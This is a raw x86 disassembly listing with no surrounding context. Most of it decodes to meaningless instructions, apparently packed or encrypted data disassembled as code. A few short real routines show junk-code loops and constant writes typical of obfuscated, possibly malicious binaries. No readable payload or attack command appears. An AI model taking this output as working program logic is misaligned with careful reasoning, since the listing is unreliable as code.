  403128:	jns    0x403120
  40312a:	lahf   
  40312b:	in     eax,0xa4
  40312d:	je     0x403167
  40312f:	xor    cl,cl
  403131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403132:	cmp    dl,ah
  403134:	mov    ds:0xfd8ce0ed,eax
  403139:	pop    edx
  40313a:	inc    esi
  40313b:	iret   
  40313c:	cwde   
  40313d:	xlat   BYTE PTR ds:[ebx]
  40313e:	pop    ebx
  40313f:	aaa    
  403140:	daa    
  403141:	and    ah,dh
  403143:	inc    edi
  403144:	mov    ecx,0xadff8186
  403149:	inc    edi
  40314a:	dec    ecx
  40314b:	xchg   ebp,eax
  40314c:	adc    edx,edi
  40314e:	mov    al,0x8a
  403150:	mov    WORD PTR [ecx+0x43],ss
  403153:	nop
  403154:	retf   0x9537
  403157:	and    al,0x58
  403159:	xchg   ebp,eax
  40315a:	mov    ebp,?
  40315c:	loope  0x4031d1
  40315e:	(bad)  
  40315f:	dec    eax
  403160:	xor    DWORD PTR ds:0x660c85fa,ecx
  403166:	adc    eax,0x84657466
  40316b:	(bad)  
  40316c:	je     0x403181
  40316e:	popf   
  40316f:	(bad)  
  403170:	fmulp  st(7),st
  403172:	fistp  WORD PTR [ecx]
  403174:	test   DWORD PTR [ecx+0x27],ebp
  403177:	int3   
  403178:	int    0x68
  40317a:	inc    eax
  40317b:	ss push ebp
  40317e:	and    al,0x80
  403180:	ins    DWORD PTR es:[edi],dx
  403181:	loop   0x403119
  403183:	dec    edi
  403184:	mov    ebp,0x283a4624
  403189:	pusha  
  40318a:	pop    edx
  40318b:	adc    edi,esi
  40318d:	add    DWORD PTR [esi+0x7d],esi
  403190:	mov    ebp,0x6c3c2a8d
  403195:	js     0x403184
  403197:	outs   dx,BYTE PTR ds:[esi]
  403198:	into   
  403199:	iret   
  40319a:	mov    esi,0xe1d851a2
  40319f:	mov    ecx,0xafc604c0
  4031a4:	rol    edi,1
  4031a6:	dec    ebx
  4031a7:	out    dx,al
  4031a8:	add    al,0xe3
  4031aa:	fs fxch st(4)
  4031ad:	inc    ebx
  4031ae:	call   0xafaf:0xef5ee96c
  4031b5:	and    al,0xcc
  4031b7:	mov    eax,0xf1f568d1
  4031bc:	inc    ebp
  4031bd:	icebp  
  4031be:	int3   
  4031bf:	popf   
  4031c0:	cld    
  4031c1:	mov    al,0x4d
  4031c3:	mov    edi,0x878f9ae7
  4031c8:	inc    esp
  4031c9:	aad    0xe8
  4031cb:	retf   
  4031cc:	cmp    cl,BYTE PTR [edi+0x3d2d2be2]
  4031d2:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4031d4:	loop   0x403197
  4031d6:	std    
  4031d7:	xchg   ebx,eax
  4031d8:	xor    DWORD PTR [eax-0x66],ecx
  4031db:	dec    edx
  4031dc:	das    
  4031dd:	test   al,0x37
  4031df:	mov    BYTE PTR [esi],bl
  4031e1:	ja     0x403183
  4031e3:	push   es
  4031e4:	retf   
  4031e5:	icebp  
  4031e6:	cdq    
  4031e7:	and    eax,0x37c03983
  4031ec:	push   0x2a921383
  4031f1:	xor    BYTE PTR [ecx+edx*2-0x73],cl
  4031f5:	dec    ecx
  4031f6:	and    BYTE PTR [edx+0x1b1e5f0e],al
  4031fc:	call   0xd7f2699c
  403201:	inc    eax
  403202:	push   esp
  403203:	sbb    eax,0x9d72b066
  403208:	inc    esi
  403209:	push   0x65051ab7
  40320e:	out    0x4c,al
  403210:	ins    BYTE PTR es:[edi],dx
  403211:	dec    esp
  403212:	dec    esp
  403213:	je     0x403260
  403215:	cld    
  403216:	adc    al,BYTE PTR [ecx]
  403218:	aas    
  403219:	inc    edx
  40321a:	bound  ebx,QWORD PTR [ebp+edi*8+0x53a6314e]
  403221:	hlt    
  403222:	outs   dx,DWORD PTR ds:[esi]
  403223:	ror    BYTE PTR [esi],0x0
  403226:	dec    edi
  403227:	cmp    BYTE PTR [ecx],bl
  403229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40322a:	hlt    
  40322b:	out    0x90,eax
  40322d:	stos   DWORD PTR es:[edi],eax
  40322e:	jmp    0xad6f0dfe
  403233:	stos   BYTE PTR es:[edi],al
  403234:	and    cl,BYTE PTR [edx-0x2e8fc0b2]
  40323a:	lods   al,BYTE PTR ds:[esi]
  40323b:	sub    al,0x56
  40323d:	mov    bh,BYTE PTR [edi]
  40323f:	retf   
  403240:	aad    0xf8
  403242:	pop    esp
  403243:	call   0xf8cf4f77
  403248:	sub    al,0x67
  40324a:	mov    ebp,es
  40324c:	mov    edi,0x9c8a429b
  403251:	stc    
  403252:	sub    al,0x5f
  403254:	cmp    eax,edx
  403256:	ins    BYTE PTR es:[edi],dx
  403257:	test   eax,0x498ed981
  40325c:	adc    al,0xf0
  40325e:	outs   dx,BYTE PTR ds:[esi]
  40325f:	aam    0xf
  403261:	cmp    edx,DWORD PTR [edx+0x49aa7c1d]
  403267:	xor    BYTE PTR [edi],cl
  403269:	dec    edx
  40326a:	fsub   QWORD PTR ds:0x649f3d1
  403270:	cmp    eax,0x361df67b
  403275:	sub    esp,DWORD PTR [esi]
  403277:	xchg   BYTE PTR [edi],al
  403279:	xchg   esi,eax
  40327a:	pop    ecx
  40327b:	ins    DWORD PTR es:[edi],dx
  40327c:	in     eax,dx
  40327d:	stos   DWORD PTR es:[edi],eax
  40327e:	sbb    al,0x6b
  403280:	ja     0x40328b
  403282:	dec    esp
  403283:	mov    esi,0xf8a12a9e
  403288:	push   es
  403289:	mov    DWORD PTR [edx],ecx
  40328b:	(bad)  [ecx+0x1d]
  40328e:	jecxz  0x4032ee
  403290:	daa    
  403291:	inc    esp
  403292:	jmp    FWORD PTR [eax+0x3a5acbdb]
  403298:	or     edi,ecx
  40329a:	mov    ah,0xe8
  40329c:	inc    edi
  40329d:	xlat   BYTE PTR ds:[ebx]
  40329e:	adc    bl,BYTE PTR [eax+0x1c]
  4032a1:	scas   eax,DWORD PTR es:[edi]
  4032a2:	mov    edx,db5
  4032a5:	adc    BYTE PTR [ebx],dh
  4032a7:	iret   
  4032a8:	js     0x403233
  4032aa:	test   eax,0xd7f118f9
  4032af:	mov    al,ds:0x6f101d4e
  4032b4:	int3   
  4032b5:	rcl    DWORD PTR [ebx+0x61],0x53
  4032b9:	jp     0x40328f
  4032bb:	sbb    BYTE PTR [esi+edi*8+0x4e8eaffb],ah
  4032c2:	lods   al,BYTE PTR ds:[esi]
  4032c3:	add    ah,BYTE PTR [eax-0x5119eefe]
  4032c9:	sbb    bh,cl
  4032cb:	std    
  4032cc:	push   edx
  4032cd:	jle    0x40329c
  4032cf:	ret    
  4032d0:	les    edi,FWORD PTR [edx-0xe]
  4032d3:	inc    esp
  4032d4:	lock (bad) 
  4032d6:	mov    cl,0x1b
  4032d8:	push   esp
  4032d9:	cli    
  4032da:	push   esi
  4032db:	xchg   DWORD PTR [ebp-0x7b],ebp
  4032de:	push   0xffffffb0
  4032e0:	scas   eax,DWORD PTR es:[edi]
  4032e1:	repz xchg esi,eax
  4032e3:	push   esp
  4032e4:	mov    al,0x69
  4032e6:	inc    ebx
  4032e7:	push   edi
  4032e8:	mov    BYTE PTR gs:[eax],bl
  4032eb:	cwde   
  4032ec:	or     BYTE PTR [edi-0x4b],bh
  4032ef:	mov    al,ds:0xef354892
  4032f4:	jns    0x40336b
  4032f6:	mov    dl,ah
  4032f8:	cli    
  4032f9:	js     0x4032d6
  4032fb:	outs   dx,BYTE PTR ds:[esi]
  4032fc:	mov    ebp,0x40ea15e8
  403301:	push   edi
  403302:	icebp  
  403303:	mov    ecx,DWORD PTR [ebp-0x53]
  403306:	(bad)
  40330a:	xchg   esi,eax
  40330b:	push   ss
  40330c:	ins    BYTE PTR es:[edi],dx
  40330d:	outs   dx,BYTE PTR ds:[esi]
  40330e:	mov    bl,0xb8
  403310:	pop    edx
  403311:	idiv   DWORD PTR [eax+ebx*8+0x2f]
  403315:	sub    eax,0x959df079
  40331a:	out    0x1,eax
  40331c:	lods   eax,DWORD PTR ds:[esi]
  40331d:	mov    DWORD PTR [ebx-0x62],edi
  403320:	add    ch,bl
  403322:	icebp  
  403323:	cmc    
  403324:	mov    eax,0x5a2e040e
  403329:	jmp    0x40331b
  40332b:	add    DWORD PTR [esp+ebx*8],eax
  40332e:	mov    ah,0x42
  403330:	inc    eax
  403331:	iret   
  403332:	push   ss
  403333:	jo     0x403315
  403335:	mov    eax,0xfaec3985
  40333a:	push   es
  40333b:	jecxz  0x403319
  40333d:	pop    esp
  40333e:	fisubr WORD PTR [ebx]
  403340:	and    al,0x71
  403342:	sub    bh,dh
  403344:	into   
  403345:	arpl   cx,bx
  403347:	cld    
  403348:	mov    db6,esi
  40334b:	ret    
  40334c:	xchg   esp,eax
  40334d:	inc    eax
  40334e:	mov    eax,ds:0x7bd5850d
  403353:	int    0x9
  403355:	std    
  403356:	pop    esi
  403357:	shl    BYTE PTR [edi],0x68
  40335a:	dec    ebp
  40335b:	and    al,0x31
  40335d:	jg     0x40338f
  40335f:	outs   dx,BYTE PTR ds:[esi]
  403360:	push   ds
  403361:	pop    ebx
  403362:	mov    dl,0x2f
  403364:	imul   ebx,DWORD PTR [esi-0x30],0xffffffc4
  403368:	shl    BYTE PTR [ecx+0x6b26158e],0xd6
  40336f:	push   0xffffff87
  403371:	pop    esi
  403372:	aam    0x1d
  403374:	dec    ecx
  403375:	pop    ebx
  403376:	cdq    
  403377:	pop    es
  403378:	mov    ds:0x361757c9,al
  40337d:	sahf   
  40337e:	loop   0x40333a
  403380:	xor    eax,0xa3c1b85a
  403385:	test   cl,bl
  403387:	cmp    BYTE PTR [esp+eax*8+0x1e356c96],al
  40338e:	mov    bl,0x45
  403390:	jnp    0x40337e
  403392:	jg     0x40335d
  403394:	ja     0x4033c1
  403396:	push   ecx
  403397:	mov    al,0x71
  403399:	jo     0x403403
  40339b:	mov    esi,DWORD PTR [ebp+0x8]
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	mov    ss,esp
  4033bb:	xor    esp,esp
  4033bd:	cmp    dl,BYTE PTR [eax+esi*2]
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x40340e
  4033c6:	(bad)  
  4033c7:	das    
  4033c8:	js     0x4033d1
  4033ca:	mov    WORD PTR [ebx+0x16],ss
  4033cd:	cmp    ebp,DWORD PTR [eax-0x1875df8f]
  4033d3:	push   ecx
  4033d4:	jmp    0x7b00f81b
  4033d9:	das    
  4033da:	sti    
  4033db:	or     al,0x6b
  4033dd:	inc    ebx
  4033de:	mov    ?,WORD PTR [esi-0x3be19eb9]
  4033e4:	sbb    eax,0x7bbae96f
  4033e9:	push   edx
  4033ea:	imul   ebx,DWORD PTR [eax],0x77
  4033ed:	or     al,0x3d
  4033ef:	add    ecx,DWORD PTR ds:0x593f8df3
  4033f5:	inc    edx
  4033f6:	sbb    al,0xef
  4033f8:	repz ror cl,0x1
  4033fc:	sub    eax,0xbfeab32e
  403401:	jae    0x4033f1
  403403:	cmp    cl,ah
  403405:	fild   QWORD PTR [ecx]
  403407:	mov    eax,ds:0xb68b078f
  40340c:	push   ebx
  40340d:	cmp    ebx,DWORD PTR [edx+0x2a5894f9]
  403413:	cwde   
  403414:	mov    ebx,ecx
  403416:	ja     0x4033d3
  403418:	adc    bl,BYTE PTR [ebx+ebx*8-0x5]
  40341c:	rep outs dx,DWORD PTR ds:[esi]
  40341e:	sahf   
  40341f:	(bad)  
  403421:	adc    eax,0x9139e008
  403426:	sub    edx,ebp
  403428:	adc    al,0x91
  40342a:	or     al,0x3d
  40342c:	push   0x3744886e
  403431:	loop   0x403428
  403433:	scas   eax,DWORD PTR es:[edi]
  403434:	jge    0x4033f4
  403436:	icebp  
  403437:	adc    eax,0xf2a00ebe
  40343c:	add    al,0xb3
  40343e:	mov    dh,bh
  403440:	xor    al,0xb8
  403442:	push   esp
  403443:	or     DWORD PTR [edi],ebx
  403445:	xor    DWORD PTR [ebx-0x2a27572f],0x393acc6c
  40344f:	cmp    al,0xe0
  403451:	lock xor ah,bh
  403454:	fmulp  st(6),st
  403456:	dec    esi
  403457:	xchg   ecx,eax
  403458:	sub    esp,edx
  40345a:	adc    bh,BYTE PTR [edi]
  40345c:	cmp    al,0xda
  40345e:	ret    
  40345f:	or     cl,BYTE PTR [ebx+0x51]
  403462:	jno    0x403417
  403464:	adc    eax,DWORD PTR [edx+0x2a8ee9a6]
  40346a:	push   ds
  40346b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40346c:	add    DWORD PTR [esi],0x2dfea114
  403472:	lea    ebp,[edi+0x59]
  403475:	jae    0x4034ca
  403477:	adc    BYTE PTR ds:0x7107a34d,bl
  40347d:	sahf   
  40347e:	in     eax,dx
  40347f:	xor    eax,0xb14657ab
  403484:	int3   
  403485:	xchg   esi,eax
  403486:	xchg   ebx,eax
  403487:	xchg   edi,eax
  403488:	or     al,0x33
  40348a:	jle    0x403508
  40348c:	inc    ebx
  40348d:	lahf   
  40348e:	ja     0x403423
  403490:	fnstsw WORD PTR [ebx]
  403492:	cmp    edi,DWORD PTR [edi-0x5b]
  403495:	fdiv   DWORD PTR [eax-0x40]
  403498:	in     al,0x4b
  40349a:	pop    ds
  40349b:	xor    eax,0x66a04c67
  4034a0:	pop    edi
  4034a1:	call   0x8d39:0xa2547b90
  4034a8:	or     eax,0x30e341c6
  4034ad:	fdiv   QWORD PTR [ebp+0x3d]
  4034b0:	push   edi
  4034b1:	xlat   BYTE PTR cs:[ebx]
  4034b3:	in     eax,dx
  4034b4:	cmp    ebx,DWORD PTR [ecx+0x6b]
  4034b7:	mov    ebx,0xf7c9a70c
  4034bc:	sar    BYTE PTR [edi-0x6d263b33],0x17
  4034c3:	iret   
  4034c4:	sti    
  4034c5:	push   es
  4034c6:	jl     0x403490
  4034c8:	iret   
  4034c9:	jns    0x4034b9
  4034cb:	push   ds
  4034cc:	mov    DWORD PTR [ebx],ecx
  4034ce:	or     eax,0x7492b1e3
  4034d3:	push   ebx
  4034d4:	adc    DWORD PTR [ecx],edx
  4034d6:	jb     0x4034d1
  4034d8:	push   edx
  4034d9:	pop    eax
  4034da:	jl     0x403513
  4034dc:	inc    esp
  4034dd:	add    BYTE PTR [eax-0x47],ch
  4034e0:	or     ebp,DWORD PTR [ebp+0x12]
  4034e3:	in     al,0x1b
  4034e5:	lea    ebx,ss:[esi+0x76]
  4034e9:	rol    BYTE PTR [ecx+eiz*2],1
  4034ec:	cmp    eax,0x2e58e137
  4034f1:	test   al,0xe
  4034f3:	jmp    0x9ddb5796
  4034f8:	scas   eax,DWORD PTR es:[edi]
  4034f9:	lods   eax,DWORD PTR ds:[esi]
  4034fa:	xor    edx,edi
  4034fc:	push   es
  4034fd:	cmp    eax,0x81937429
  403502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403503:	jbe    0x40349a
  403505:	jns    0x40355d
  403507:	std    
  403508:	xchg   edi,eax
  403509:	in     al,dx
  40350a:	lea    ebx,[edi-0x79]
  40350d:	in     eax,dx
  40350e:	ins    BYTE PTR es:[edi],dx
  40350f:	popf   
  403510:	adc    edi,DWORD PTR [edi+esi*2-0x201daa1e]
  403517:	mov    ebx,DWORD PTR [ebx-0x56]
  40351a:	test   al,0x97
  40351c:	scas   al,BYTE PTR es:[edi]
  40351d:	cdq    
  40351e:	test   BYTE PTR [ecx],cl
  403520:	lea    edx,[edi]
  403522:	mov    al,BYTE PTR [edi+0x584afb63]
  403528:	inc    esi
  403529:	mov    esi,0x572cc4e0
  40352e:	inc    esi
  40352f:	lds    ebx,FWORD PTR [edi+edx*4]
  403532:	jmp    FWORD PTR [ebp-0x3959c79b]
  403538:	imul   edx,esi,0x145e4309
  40353e:	add    eax,0xe330b674
  403543:	rcr    BYTE PTR [edi+eiz*1+0x29ca94f9],cl
  40354a:	push   0x67
  40354c:	pop    edi
  40354d:	pop    ds
  40354e:	jle    0x4034eb
  403550:	push   edx
  403551:	in     al,0x56
  403553:	int3   
  403554:	enter  0x8a10,0xcf
  403558:	push   esi
  403559:	jmp    0x1fb4:0x93db1da2
  403560:	xor    bh,BYTE PTR [edi]
  403562:	push   esi
  403563:	jmp    0x3cf4:0xbfc4e3af
  40356a:	xor    DWORD PTR [edx],esi
  40356c:	mov    esp,esp
  40356e:	dec    esi
  40356f:	add    ebp,DWORD PTR [edi]
  403571:	or     cl,BYTE PTR [ebx-0x6d]
  403574:	xor    cl,BYTE PTR [ecx+edi*8]
  403577:	jo     0x40351a
  403579:	call   0x4fd1ff8d
  40357e:	mov    esp,0x2713a29f
  403583:	xchg   edx,eax
  403584:	cwde   
  403585:	adc    eax,0x16d63583
  40358a:	sub    cl,ah
  40358c:	pop    ebx
  40358d:	and    al,0xd4
  40358f:	jno    0x403562
  403591:	call   0x1b25:0xf9dd046b
  403598:	in     al,dx
  403599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40359a:	sub    ebp,edi
  40359c:	cmp    ecx,edx
  40359e:	jmp    0xb6ec:0x30228963
  4035a5:	pop    edx
  4035a6:	or     al,0xdd
  4035a8:	mov    BYTE PTR [ecx-0x6b832562],cl
  4035ae:	dec    ebx
  4035af:	pop    esp
  4035b0:	mov    ebp,0x2130a7ac
  4035b5:	cdq    
  4035b6:	mov    BYTE PTR [eax*4+0x3e4ca454],bh
  4035bd:	dec    edx
  4035be:	sahf   
  4035bf:	jge    0x4035bb
  4035c1:	dec    ebp
  4035c2:	pop    edx
  4035c3:	sbb    bh,ah
  4035c5:	loop   0x4035ee
  4035c7:	mov    esi,0xc8adb382
  4035cc:	add    ebx,DWORD PTR ds:0x6d0973e4
  4035d2:	mov    esi,ebp
  4035d4:	xchg   edi,eax
  4035d5:	inc    esi
  4035d6:	lahf   
  4035d7:	shl    DWORD PTR [ebp-0x3a],cl
  4035da:	bound  ebx,QWORD PTR [ebx+0x1c]
  4035dd:	jb     0x403638
  4035df:	push   esp
  4035e0:	xchg   edx,eax
  4035e1:	rcr    DWORD PTR [edi-0x38],0xc4
  4035e5:	jb     0x4035be
  4035e7:	cs xchg esp,eax
  4035e9:	enter  0xdf69,0xfb
  4035ed:	or     BYTE PTR [ebx],al
  4035ef:	stos   DWORD PTR es:[edi],eax
  4035f0:	jl     0x40361f
  4035f2:	popf   
  4035f3:	mov    eax,gs:0x539028c0
  4035f9:	inc    ebp
  4035fa:	out    0x9d,eax
  4035fc:	and    ebp,ecx
  4035fe:	jno    0x403586
  403600:	mov    esp,0xb499b8a3
  403605:	fdivr  st(6),st
  403607:	inc    ebx
  403608:	jl     0x403658
  40360a:	ins    DWORD PTR es:[edi],dx
  40360b:	sti    
  40360c:	mov    ebx,0xa1ce0696
  403611:	or     DWORD PTR [ecx],edx
  403613:	and    eax,DWORD PTR [eax+0x52]
  403616:	xor    al,0x49
  403618:	icebp  
  403619:	retf   
  40361a:	ins    DWORD PTR es:[edi],dx
  40361b:	and    edx,ebx
  40361d:	jne    0x4035a7
  40361f:	adc    edx,DWORD PTR [edx+eax*1-0x39]
  403623:	xchg   BYTE PTR [ecx*1-0x6bef852],ah
  40362a:	push   esp
  40362b:	cmp    dh,BYTE PTR [edx]
  40362d:	cs cli 
  40362f:	clc    
  403630:	shl    BYTE PTR [ebx-0x2ef9a1f1],0x3d
  403637:	mov    ch,ch
  403639:	nop
  40363a:	and    eax,0x9eec0541
  40363f:	sbb    al,0xc
  403641:	xor    ebp,ecx
  403643:	dec    esp
  403644:	std    
  403645:	sub    ebp,esi
  403647:	pop    edx
  403648:	or     BYTE PTR [esi+0x5969865a],ah
  40364e:	xchg   ebx,eax
  40364f:	sbb    eax,0xdea96795
  403654:	push   eax
  403655:	sub    cl,BYTE PTR [edi-0x56241578]
  40365b:	mov    cl,0x38
  40365d:	push   eax
  40365e:	mov    esp,0x461fa21c
  403663:	or     al,0xce
  403665:	mov    bh,0xf0
  403667:	jnp    0x403648
  403669:	pop    ss
  40366a:	in     al,dx
  40366b:	or     al,0xca
  40366d:	mov    ebp,0x164ccdb6
  403672:	cld    
  403673:	bound  edi,QWORD PTR [edi-0x69a0aa28]
  403679:	inc    ebp
  40367a:	loop   0x40363d
  40367c:	pop    edi
  40367d:	jg     0x4036f7
  40367f:	and    BYTE PTR [ebx-0x711b99aa],cl
  403685:	mov    eax,ds:0x3848aaf
  40368a:	pushf  
  40368b:	jb     0x4036bf
  40368d:	add    BYTE PTR [eax+0x458b3704],cl
  403693:	cld    
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fc6d,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fc6d,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fc6d,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e257
  4036fc:	cmp    DWORD PTR ds:0x42fc6d,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fc6d
  403711:	dec    eax
  403712:	mov    ds:0x42fc6d,eax
  403717:	mov    eax,ds:0x42fc6d
  40371c:	dec    eax
  40371d:	mov    ds:0x42fc6d,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e673,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e677,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fc8d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e693,0x42e09c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fcfa,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e0a4,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e68f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [esp+ecx*8-0x52],edx
  4037a4:	add    DWORD PTR [eax+0x11],edi
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0xac70707d
  4037ae:	mov    cs,WORD PTR [ebx]
  4037b0:	adc    edx,0xffffffd9
  4037b3:	adc    al,0xeb
  4037b5:	mov    esp,0x77f2d48
  4037ba:	pop    ebp
  4037bb:	mov    cl,al
  4037bd:	arpl   sp,cx
  4037bf:	lods   eax,DWORD PTR ds:[esi]
  4037c0:	inc    esi
  4037c1:	push   cs
  4037c2:	mov    eax,ds:0x8c0a5d18
  4037c7:	inc    eax
  4037c8:	clc    
  4037c9:	add    edx,DWORD PTR [edi-0x45aa26df]
  4037cf:	add    bl,BYTE PTR [edx]
  4037d1:	stos   DWORD PTR es:[edi],eax
  4037d2:	mov    esi,0xe9c9eda8
  4037d7:	jo     0x403794
  4037d9:	sub    eax,0x8836cd36
  4037de:	push   esi
  4037df:	dec    ebx
  4037e0:	das    
  4037e1:	mov    ebp,0xa5d9b91c
  4037e6:	cdq    
  4037e7:	inc    ecx
  4037e8:	or     BYTE PTR [ebx+ebx*4+0x2d],0xd5
  4037ed:	pop    esp
  4037ee:	daa    
  4037ef:	shl    DWORD PTR [eax],cl
  4037f1:	mov    ebx,ebp
  4037f3:	dec    esi
  4037f4:	bound  ebp,QWORD PTR [esi]
  4037f6:	lods   eax,DWORD PTR ds:[esi]
  4037f7:	(bad)  
  4037f9:	ret    
  4037fa:	adc    BYTE PTR [ebp+0x53b8077e],bh
  403800:	adc    al,0x8d
  403802:	rol    BYTE PTR ds:0x48e090c,1
  403808:	jle    0x40381b
  40380a:	mov    ds:0x5b3d1d10,eax
  40380f:	xor    BYTE PTR [eax-0x3a],bl
  403812:	clc    
  403813:	or     BYTE PTR [eax+ebp*8],dh
  403816:	xlat   BYTE PTR ds:[ebx]
  403817:	jl     0x403863
  403819:	sub    ch,BYTE PTR [edx]
  40381b:	ins    BYTE PTR es:[edi],dx
  40381c:	cmp    BYTE PTR [esp+edx*8-0x59],dl
  403820:	inc    esi
  403821:	push   esp
  403822:	xor    eax,0x18a7dfe8
  403827:	push   edx
  403828:	mov    ds:0xb9c82662,ax
  40382e:	nop
  40382f:	imul   esi,edx,0xffffff95
  403832:	fimul  DWORD PTR [esp+ecx*8+0x7]
  403836:	retf   
  403837:	push   ecx
  403838:	xchg   edi,eax
  403839:	dec    esp
  40383a:	pop    edi
  40383b:	shr    BYTE PTR [eax],1
  40383d:	stc    
  40383e:	scas   al,BYTE PTR es:[edi]
  40383f:	fisttp DWORD PTR [ebx+0x40c235a7]
  403845:	sti    
  403846:	pop    edi
  403847:	or     eax,0x80de2fae
  40384c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40384d:	jns    0x40388b
  40384f:	in     al,dx
  403850:	cld    
  403851:	(bad)  
  403852:	mov    ebp,0xb8efd887
  403857:	(bad)  
  403858:	or     eax,0x8f008c7d
  40385d:	outs   dx,DWORD PTR ds:[esi]
  40385e:	add    al,0x26
  403860:	dec    ecx
  403861:	aas    
  403862:	out    0x8,eax
  403864:	loop   0x4037fc
  403866:	nop
  403867:	mov    BYTE PTR [esi+0x71083e99],cl
  40386d:	sti    
  40386e:	or     cl,BYTE PTR [eax]
  403870:	sbb    ch,bl
  403872:	sub    dh,BYTE PTR ds:0x27e024b3
  403878:	dec    esi
  403879:	xchg   esp,eax
  40387a:	add    al,0x74
  40387c:	jmp    0x403822
  40387e:	popf   
  40387f:	add    dh,BYTE PTR [ebx+0x58c6f86c]
  403885:	loop   0x4038a0
  403887:	scas   al,BYTE PTR es:[edi]
  403888:	push   cs
  403889:	jecxz  0x403867
  40388b:	push   esp
  40388c:	mov    ah,0x3e
  40388e:	hlt    
  40388f:	fistp  DWORD PTR [edx-0x32]
  403892:	dec    ecx
  403893:	jne    0x40385a
  403895:	cmp    al,0x66
  403897:	jo     0x40381c
  403899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40389a:	and    BYTE PTR [esi+eax*2-0x31],bh
  40389e:	das    
  40389f:	mov    DWORD PTR [edx-0x9f88c1b],ebx
  4038a5:	(bad)  
  4038a9:	sub    eax,0x27fa90f5
  4038ae:	dec    edx
  4038af:	sub    BYTE PTR [edx+0x43],0xf5
  4038b3:	push   edi
  4038b4:	jl     0x40390e
  4038b6:	dec    esp
  4038b7:	hlt    
  4038b8:	push   0x55a96604
  4038bd:	jp     0x403939
  4038bf:	les    edx,FWORD PTR [eax-0x6b3f59e6]
  4038c5:	ins    BYTE PTR es:[edi],dx
  4038c6:	cld    
  4038c7:	nop
  4038c8:	jmp    0x7a77:0xd1823cba
  4038cf:	cmp    al,0x88
  4038d1:	lds    edi,FWORD PTR [ebx+eax*2+0x38ffcc3e]
  4038d8:	cmp    bh,al
  4038da:	cs push ecx
  4038dc:	jecxz  0x4038df
  4038de:	call   0xe9ba:0x7b46fee0
  4038e5:	outs   dx,DWORD PTR ds:[esi]
  4038e6:	pop    esi
  4038e7:	inc    esi
  4038e8:	mov    al,ds:0xc05f4a75
  4038ed:	test   eax,0xa100ba83
  4038f2:	iret   
  4038f3:	ds int 0xe8
  4038f6:	pop    ds
  4038f7:	cmp    DWORD PTR [ecx],0x36913ac0
  4038fd:	clc    
  4038fe:	sbb    ah,0x89
  403901:	fsubr  st(6),st
  403903:	add    edi,DWORD PTR [edx+0x22]
  403906:	push   eax
  403907:	imul   eax,DWORD PTR [edi-0x7f28f232],0xc0386f03
  403911:	sub    dl,al
  403913:	repz mov ds:0x4ae467be,eax
  403919:	loope  0x403916
  40391b:	sar    BYTE PTR ds:0xcf11feb2,1
  403921:	loop   0x4038c7
  403923:	mov    al,ds:0xf7cd87e9
  403928:	cli    
  403929:	xor    DWORD PTR [ecx+0x48856876],0x72
  403930:	jmp    0xbc1b:0x4f428807
  403937:	fs mov edx,0x40be1886
  40393d:	add    eax,esp
  40393f:	sti    
  403940:	call   0xe4434125
  403945:	das    
  403946:	add    BYTE PTR [esi],bl
  403948:	jl     0x4039b7
  40394a:	ret    
  40394b:	cmp    DWORD PTR [esi],eax
  40394d:	in     al,0x5a
  40394f:	and    al,0xee
  403951:	jbe    0x403954
  403953:	push   cs
  403954:	dec    ecx
  403955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
